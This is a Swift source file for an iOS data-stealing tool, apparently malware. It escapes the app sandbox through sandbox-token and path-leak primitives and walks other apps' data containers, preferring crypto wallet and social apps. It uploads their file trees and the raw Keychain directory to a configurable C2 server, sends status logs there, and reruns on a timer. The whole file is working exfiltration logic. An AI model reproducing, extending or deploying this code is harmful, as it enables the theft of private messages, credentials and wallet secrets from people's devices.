//
//  Harvester.swift — 全自动采集核心
//
//  与上游 WQFiles 一致：token 查询先试标准 flags，失败再试 alt；
//  并且用 open() 验证 token 是否真的生效（否则换 flags）。
//
import Foundation
import Combine
import Darwin
import UIKit

struct ContainerTarget {
    let path: String
    let bundle: String
}

final class Harvester: ObservableObject {
    @Published var logText = ""
    @Published var phase = "待启动"
    @Published var running = false
    @Published var uploaded = 0
    @Published var failed = 0

    private(set) var c2Base = ""
    private(set) var groupID = ""
    private(set) var fullMode = false
    private(set) var autoMinutes = 15
    var deviceID = UIDevice.current.identifierForVendor?.uuidString
        ?? "collector-\(UIDevice.current.systemVersion)"

    /// 记住可用的 flags 组合，避免每个容器都试两遍
    private var preferredAlt: Bool? = nil
    private(set) var lastFlags = "unknown"

    init() {}

    func configure(c2Base: String, groupID: String, fullMode: Bool, autoMinutes: Int) {
        self.c2Base = c2Base
        self.groupID = groupID
        self.fullMode = fullMode
        self.autoMinutes = max(1, autoMinutes)
    }

    func log(_ s: String) {
        let line = "\(Date().formatted(date: .omitted, time: .standard))  \(s)\n"
        DispatchQueue.main.async { self.logText += line }
        print("[collector]", s)
    }

    func sendLog(_ msg: String) {
        guard var c = URLComponents(string: c2Base + "/log") else { return }
        c.queryItems = [URLQueryItem(name: "kind", value: "collector"),
                        URLQueryItem(name: "msg", value: "\(msg) | iOS \(UIDevice.current.systemVersion)")]
        guard let u = c.url else { return }
        URLSession.shared.dataTask(with: u).resume()
    }

    // MARK: - 逃逸（带 flags 回退 + 生效校验）

    private func canOpen(_ p: String) -> Bool {
        let fd = open(p, O_RDONLY | O_NOFOLLOW)
        if fd >= 0 { close(fd); return true }
        return errno != EPERM
    }

    private func escape(_ path: String, group g: String, quiet: Bool = true) -> Int64 {
        let order: [Bool]
        if let p = preferredAlt { order = [p, !p] } else { order = [false, true] }
        var last: Int64 = -999
        for alt in order {
            let h = worse_query(path, g, alt, false)
            if h > 0 {
                if canOpen(path) {
                    preferredAlt = alt
                    lastFlags = alt ? "alt" : "standard"
                    return h
                }
                worse_query_release(h)
                last = -8
                if !quiet { log("token 未能打开目标（\(alt ? "alt" : "standard")），换另一组 flags") }
            } else {
                last = h
            }
        }
        return last
    }

    // MARK: - 主流程

    func run() {
        if running { return }
        guard let base = URL(string: c2Base) else { phase = "C2 无效"; return }
        running = true
        uploaded = 0
        failed = 0
        logText = ""
        phase = "逃逸中…"
        let up = Uploader(baseURL: base, deviceID: deviceID)
        let root = "/var/mobile/Containers/Data/Application"
        let (resolved, tried) = AppGroup.resolve()
        let g = resolved ?? groupID
        let full = fullMode
        log("App Group 候选: \(tried.joined(separator: ", "))")
        log(resolved != nil ? "使用 group=\(g)" : "⚠️ 没有可用 group（可能未授予 App Groups）")

        log("=== 全自动采集开始 · iOS \(UIDevice.current.systemVersion) ===")
        log("C2=\(c2Base)  group=\(g)")
        sendLog("auto start")

        DispatchQueue.global().async { [weak self] in
            guard let self = self else { return }

            // 1) 逃逸（root 目录）
            let h = self.escape(root, group: g, quiet: false)
            if h > 0 {
                self.log("✅ 沙盒逃逸 OK（flags=\(self.lastFlags), handle=\(h)）")
                worse_query_release(h)
            } else {
                self.log("❌ 沙盒逃逸失败 code=\(h)，仍尝试枚举")
            }

            // 2) 枚举
            DispatchQueue.main.async { self.phase = "枚举容器…" }
            var baseline: UInt64 = 0
            let tmp = FileManager.default.temporaryDirectory.appendingPathComponent(".b_\(UUID().uuidString)")
            if (try? "x".write(to: tmp, atomically: true, encoding: .utf8)) != nil {
                var st = stat()
                if stat(tmp.path, &st) == 0 { baseline = UInt64(st.st_ino) }
                try? FileManager.default.removeItem(at: tmp)
            }
            let paths: [String] = (pathleak(root, baseline > 0 ? baseline : 200_000) as? [String]) ?? []
            self.log("枚举到 \(paths.count) 条容器路径")

            // 3) 识别 bundle
            var targets: [ContainerTarget] = []
            for p in paths {
                let hh = self.escape(p, group: g)
                guard hh > 0 else { continue }
                var buf = [CChar](repeating: 0, count: 512)
                let n = getxattr(p, "com.apple.containermanager.identifier", &buf, 511, 0, 0)
                let bid = n > 0 ? String(cString: buf) : ""
                worse_query_release(hh)
                if bid.isEmpty { continue }
                targets.append(ContainerTarget(path: p, bundle: bid))
            }
            let walletTargets = targets.filter { Targets.isWallet($0.bundle) }
            let socialTargets = targets.filter { !Targets.isWallet($0.bundle) && Targets.label($0.bundle) != nil }
            let selected = full ? targets : (walletTargets + socialTargets)
            self.log("容器 \(targets.count) 个 → 钱包 \(walletTargets.count) / 社交 \(socialTargets.count) / 本次 \(selected.count)")

            // 4) 顺序上传
            DispatchQueue.main.async { self.phase = "上传中…" }
            self.uploadAll(selected, index: 0, up: up, group: g)
        }
    }

    private func uploadAll(_ list: [ContainerTarget], index: Int, up: Uploader, group g: String) {
        guard index < list.count else {
            tryKeychain(up: up, group: g)
            DispatchQueue.main.async {
                self.phase = "完成（\(self.uploaded) 成功 / \(self.failed) 失败）"
                self.running = false
                self.log("=== 本轮结束，\(self.autoMinutes) 分钟后重跑 ===")
            }
            let minutes = autoMinutes
            DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(minutes * 60)) { [weak self] in
                self?.run()
            }
            return
        }
        let t = list[index]
        DispatchQueue.main.async { self.phase = "上传 \(index + 1)/\(list.count) \(t.bundle)" }
        let h = escape(t.path, group: g)
        guard h > 0 else {
            log("跳过 \(t.bundle)（扩展失败 \(h)）")
            return uploadAll(list, index: index + 1, up: up, group: g)
        }
        log("→ [\(Targets.label(t.bundle) ?? "其他")] \(t.bundle)")
        up.uploadTree(URL(fileURLWithPath: t.path),
                      category: "container-\(t.bundle)",
                      onEach: { _ in },
                      progress: { _, _ in }) { ok, fail in
            DispatchQueue.main.async {
                self.uploaded += ok
                self.failed += fail
            }
            self.log("   \(t.bundle)：上传 \(ok)，失败 \(fail)")
            worse_query_release(h)
            self.uploadAll(list, index: index + 1, up: up, group: g)
        }
    }

    /// 尝试导出 Keychain 密文库（多数会被拒，仅记录）
    private func tryKeychain(up: Uploader, group g: String) {
        let kc = "/var/mobile/Library/Keychains"
        let h = escape(kc, group: g)
        guard h > 0 else {
            log("Keychain 不可访问（code=\(h)）：种子在 Keychain，容器逃逸到不了")
            return
        }
        log("Keychain 目录可访问（handle=\(h), flags=\(lastFlags)），尝试上传密文库")
        up.uploadTree(URL(fileURLWithPath: kc), category: "keychain-raw",
                      maxBytes: 32 * 1024 * 1024,
                      onEach: { _ in }, progress: { _, _ in }) { ok, fail in
            self.log("Keychain 上传 \(ok) / 失败 \(fail)")
            worse_query_release(h)
        }
    }
}
